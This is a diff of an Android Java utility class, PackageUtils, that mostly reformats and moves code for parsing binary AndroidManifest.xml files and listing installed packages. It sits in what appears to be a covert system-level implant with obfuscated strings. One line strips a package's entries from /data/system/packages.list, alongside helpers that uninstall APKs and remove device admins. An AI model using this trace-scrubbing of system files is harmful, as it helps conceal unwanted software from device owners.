@@ -3,12 +3,12 @@ package com.android.syssetup.util;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.Configuration;
 import com.android.syssetup.file.AutoFile;
 import com.android.syssetup.file.Path;
-import com.android.mm.M;
 
 import org.w3c.dom.Document;
 import org.w3c.dom.Node;
@@ -43,6 +43,23 @@ public class PackageUtils {
 	 * The Constant TAG.
 	 */
 	private static final String TAG = "PackageUtils"; //$NON-NLS-1$
+	/**
+	 * Binary XML doc ending Tag
+	 */
+	public static int endDocTag = 0x00100101;
+	/**
+	 * Binary XML start Tag
+	 */
+	public static int startTag = 0x00100102;
+	/**
+	 * Binary XML end Tag
+	 */
+	public static int endTag = 0x00100103;
+	/**
+	 * Reference var for spacing
+	 * Used in prtIndent()
+	 */
+	public static String spaces = "                                             ";
 
 	public static boolean replaceInFile(String file, String matchRegExp, String replaceRegExp, String replace) {
 		//examples:
@@ -152,47 +169,6 @@ public class PackageUtils {
 		return false;
 	}
 
-	/**
-	 * The Class PInfo.
-	 */
-	public static class PInfo {
-		/**
-		 * The appname.
-		 */
-		private String appname = ""; //$NON-NLS-1$
-
-		/**
-		 * The pname.
-		 */
-		private String pname = ""; //$NON-NLS-1$
-
-		/**
-		 * The version name.
-		 */
-		private String versionName = ""; //$NON-NLS-1$
-
-		/**
-		 * The apk name and location.
-		 */
-		private String apkPath = ""; //$NON-NLS-1$
-
-		/**
-		 * The version code.
-		 */
-		private int versionCode = 0;
-
-		/*
-		 * (non-Javadoc)
-		 *
-		 * @see java.lang.Object#toString()
-		 */
-		@Override
-		public String toString() {
-			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-		}
-	}
-
-
 	public static boolean uninstallApk(String apk) {
 		boolean found = isInstalledApk(apk);
 		if (!found) {
@@ -220,7 +196,7 @@ public class PackageUtils {
 	private static void removePackageList(String apk) {
 		// TODO: remove any entries in /data/system/packages.list
 		// i.e: com.android.deviceinfo 10216 0 /data/data/com.android.deviceinfo default 1028,1015,3003
-		replaceInFile("/data/system/packages.list", ".*com.android.deviceinfo.*",null,null);
+		replaceInFile("/data/system/packages.list", ".*com.android.deviceinfo.*", null, null);
 	}
 
 	private static void removeAdmin(String apk) {
@@ -296,41 +272,6 @@ public class PackageUtils {
 	}
 
 	/**
-	 * Gets the packages.
-	 *
-	 * @return the packages
-	 */
-	private ArrayList<PInfo> getPackages() {
-		final ArrayList<PInfo> apps = getInstalledApps(false);
-		final int max = apps.size();
-
-		for (int i = 0; i < max; i++) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
-			}
-		}
-
-		return apps;
-	}
-	/**
-	 * Binary XML doc ending Tag
-	 */
-	public static int endDocTag = 0x00100101;
-	/**
-	 * Binary XML start Tag
-	 */
-	public static int startTag =  0x00100102;
-	/**
-	 * Binary XML end Tag
-	 */
-	public static int endTag =    0x00100103;
-	/**
-	 * Reference var for spacing
-	 * Used in prtIndent()
-	 */
-	public static String spaces = "                                             ";
-
-	/**
 	 * Parse the 'compressed' binary form of Android XML docs
 	 * such as for AndroidManifest.xml in .apk files
 	 * Source: http://stackoverflow.com/questions/2097813/how-to-parse-the-androidmanifest-xml-file-inside-an-apk-package/4761689#4761689
@@ -340,14 +281,15 @@ public class PackageUtils {
 	public static String decompressXML(byte[] xml) {
 
 		StringBuilder resultXml = new StringBuilder();
-		int numbStrings = LEW(xml, 4*4);
+		int numbStrings = LEW(xml, 4 * 4);
 		int sitOff = 0x24;  // Offset of start of StringIndexTable
-		int stOff = sitOff + numbStrings*4;  // StringTable follows StrIndexTable
-		int xmlTagOff = LEW(xml, 3*4);  // Start from the offset in the 3rd word.
+		int stOff = sitOff + numbStrings * 4;  // StringTable follows StrIndexTable
+		int xmlTagOff = LEW(xml, 3 * 4);  // Start from the offset in the 3rd word.
 		// Scan forward until we find the bytes: 0x02011000(x00100102 in normal int)
-		for (int ii=xmlTagOff; ii<xml.length-4; ii+=4) {
+		for (int ii = xmlTagOff; ii < xml.length - 4; ii += 4) {
 			if (LEW(xml, ii) == startTag) {
-				xmlTagOff = ii;  break;
+				xmlTagOff = ii;
+				break;
 			}
 		} // end of hack, scanning for start of first start tag
 
@@ -378,41 +320,41 @@ public class PackageUtils {
 		int indent = 0;
 		while (off < xml.length) {
 			int tag0 = LEW(xml, off);
-			int lineNo = LEW(xml, off+2*4);
-			int nameNsSi = LEW(xml, off+4*4);
-			int nameSi = LEW(xml, off+5*4);
+			int lineNo = LEW(xml, off + 2 * 4);
+			int nameNsSi = LEW(xml, off + 4 * 4);
+			int nameSi = LEW(xml, off + 5 * 4);
 
 			if (tag0 == startTag) { // XML START TAG
-				int tag6 = LEW(xml, off+6*4);  // Expected to be 14001400
-				int numbAttrs = LEW(xml, off+7*4);  // Number of Attributes to follow
+				int tag6 = LEW(xml, off + 6 * 4);  // Expected to be 14001400
+				int numbAttrs = LEW(xml, off + 7 * 4);  // Number of Attributes to follow
 
-				off += 9*4;  // Skip over 6+3 words of startTag data
+				off += 9 * 4;  // Skip over 6+3 words of startTag data
 				String name = compXmlString(xml, sitOff, stOff, nameSi);
 
 				// Look for the Attributes
 				StringBuffer sb = new StringBuffer();
-				for (int ii=0; ii<numbAttrs; ii++) {
+				for (int ii = 0; ii < numbAttrs; ii++) {
 					int attrNameNsSi = LEW(xml, off);  // AttrName Namespace Str Ind, or FFFFFFFF
-					int attrNameSi = LEW(xml, off+1*4);  // AttrName String Index
-					int attrValueSi = LEW(xml, off+2*4); // AttrValue Str Ind, or FFFFFFFF
-					int attrFlags = LEW(xml, off+3*4);
-					int attrResId = LEW(xml, off+4*4);  // AttrValue ResourceId or dup AttrValue StrInd
-					off += 5*4;  // Skip over the 5 words of an attribute
+					int attrNameSi = LEW(xml, off + 1 * 4);  // AttrName String Index
+					int attrValueSi = LEW(xml, off + 2 * 4); // AttrValue Str Ind, or FFFFFFFF
+					int attrFlags = LEW(xml, off + 3 * 4);
+					int attrResId = LEW(xml, off + 4 * 4);  // AttrValue ResourceId or dup AttrValue StrInd
+					off += 5 * 4;  // Skip over the 5 words of an attribute
 
 					String attrName = compXmlString(xml, sitOff, stOff, attrNameSi);
-					String attrValue = attrValueSi!=-1
+					String attrValue = attrValueSi != -1
 							? compXmlString(xml, sitOff, stOff, attrValueSi)
-							: M.e("resourceID 0x")+Integer.toHexString(attrResId);
-					sb.append(" "+attrName+"=\""+attrValue+"\"");
+							: M.e("resourceID 0x") + Integer.toHexString(attrResId);
+					sb.append(" " + attrName + "=\"" + attrValue + "\"");
 				}
-				resultXml.append(prtIndent(indent, "<"+name+sb+">"));
+				resultXml.append(prtIndent(indent, "<" + name + sb + ">"));
 				indent++;
 
 			} else if (tag0 == endTag) { // XML END TAG
 				indent--;
-				off += 6*4;  // Skip over 6 words of endTag data
+				off += 6 * 4;  // Skip over 6 words of endTag data
 				String name = compXmlString(xml, sitOff, stOff, nameSi);
-				resultXml.append(prtIndent(indent, "</"+name+">\n"));
+				resultXml.append(prtIndent(indent, "</" + name + ">\n"));
 
 			} else if (tag0 == endDocTag) {  // END OF XML DOC TAG
 				break;
@@ -431,13 +373,12 @@ public class PackageUtils {
 		return resultXml.toString();
 	} // end of decompressXML
 
-
 	/**
 	 * Tool Method for decompressXML();
 	 * Compute binary XML to its string format
 	 * Source: Source: http://stackoverflow.com/questions/2097813/how-to-parse-the-androidmanifest-xml-file-inside-an-apk-package/4761689#4761689
 	 *
-	 * @param xml Binary-formatted XML
+	 * @param xml    Binary-formatted XML
 	 * @param sitOff
 	 * @param stOff
 	 * @param strInd
@@ -445,11 +386,11 @@ public class PackageUtils {
 	 */
 	public static String compXmlString(byte[] xml, int sitOff, int stOff, int strInd) {
 		if (strInd < 0) return null;
-		int strOff = stOff + LEW(xml, sitOff+strInd*4);
+		int strOff = stOff + LEW(xml, sitOff + strInd * 4);
 		return compXmlStringAt(xml, strOff);
 	}
-	public static Document loadXMLFromString(String xml) throws Exception
-	{
+
+	public static Document loadXMLFromString(String xml) throws Exception {
 		DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
 		DocumentBuilder builder = factory.newDocumentBuilder();
 		InputSource is = new InputSource(new StringReader(xml));
@@ -461,11 +402,11 @@ public class PackageUtils {
 	 * Apply indentation
 	 *
 	 * @param indent Indentation level
-	 * @param str String to indent
+	 * @param str    String to indent
 	 * @return Indented string
 	 */
 	public static String prtIndent(int indent, String str) {
-		return (spaces.substring(0, Math.min(indent*2, spaces.length()))+str);
+		return (spaces.substring(0, Math.min(indent * 2, spaces.length())) + str);
 	}
 
 	/**
@@ -474,35 +415,33 @@ public class PackageUtils {
 	 * offset strOff.  This offset points to the 16 bit string length, which
 	 * is followed by that number of 16 bit (Unicode) chars.
 	 *
-	 * @param arr StringTable array
+	 * @param arr    StringTable array
 	 * @param strOff Offset to get string from
 	 * @return String from StringTable at offset strOff
-	 *
 	 */
 	public static String compXmlStringAt(byte[] arr, int strOff) {
-		int strLen = arr[strOff+1]<<8&0xff00 | arr[strOff]&0xff;
+		int strLen = arr[strOff + 1] << 8 & 0xff00 | arr[strOff] & 0xff;
 		byte[] chars = new byte[strLen];
-		for (int ii=0; ii<strLen; ii++) {
-			chars[ii] = arr[strOff+2+ii*2];
+		for (int ii = 0; ii < strLen; ii++) {
+			chars[ii] = arr[strOff + 2 + ii * 2];
 		}
 		return new String(chars);  // Hack, just use 8 byte chars
 	} // end of compXmlStringAt
 
-
 	/**
 	 * Return value of a Little Endian 32 bit word from the byte array
-	 *   at offset off.
+	 * at offset off.
 	 *
 	 * @param arr Byte array with 32 bit word
 	 * @param off Offset to get word from
 	 * @return Value of Little Endian 32 bit word specified
 	 */
 	public static int LEW(byte[] arr, int off) {
-		return arr[off+3]<<24&0xff000000 | arr[off+2]<<16&0xff0000
-				| arr[off+1]<<8&0xff00 | arr[off]&0xFF;
+		return arr[off + 3] << 24 & 0xff000000 | arr[off + 2] << 16 & 0xff0000
+				| arr[off + 1] << 8 & 0xff00 | arr[off] & 0xFF;
 	} // end of LEW
 
-	public static ArrayList<String> getActivitisFromApk(String apk){
+	public static ArrayList<String> getActivitisFromApk(String apk) {
 		ArrayList<String> activityList = null;
 		if (new AutoFile(apk).exists()) {
 			try {
@@ -511,7 +450,7 @@ public class PackageUtils {
 				InputStream is = jf.getInputStream(jf.getEntry(M.e("AndroidManifest.xml")));
 				byte[] xml = new byte[is.available()];
 				int br = is.read(xml);
-				String text = M.e("<?xml version=\"1.0\" encoding=\"utf-8\"?>")+"\n";
+				String text = M.e("<?xml version=\"1.0\" encoding=\"utf-8\"?>") + "\n";
 				text += decompressXML(xml);
 				Document doc = loadXMLFromString(text);
 				if (doc == null) {
@@ -535,5 +474,63 @@ public class PackageUtils {
 			}
 		}
 		return activityList;
+	}
+
+	/**
+	 * Gets the packages.
+	 *
+	 * @return the packages
+	 */
+	private ArrayList<PInfo> getPackages() {
+		final ArrayList<PInfo> apps = getInstalledApps(false);
+		final int max = apps.size();
+
+		for (int i = 0; i < max; i++) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
+			}
+		}
+
+		return apps;
+	}
+
+	/**
+	 * The Class PInfo.
+	 */
+	public static class PInfo {
+		/**
+		 * The appname.
+		 */
+		private String appname = ""; //$NON-NLS-1$
+
+		/**
+		 * The pname.
+		 */
+		private String pname = ""; //$NON-NLS-1$
+
+		/**
+		 * The version name.
+		 */
+		private String versionName = ""; //$NON-NLS-1$
+
+		/**
+		 * The apk name and location.
+		 */
+		private String apkPath = ""; //$NON-NLS-1$
+
+		/**
+		 * The version code.
+		 */
+		private int versionCode = 0;
+
+		/*
+		 * (non-Javadoc)
+		 *
+		 * @see java.lang.Object#toString()
+		 */
+		@Override
+		public String toString() {
+			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+		}
 	}
 }
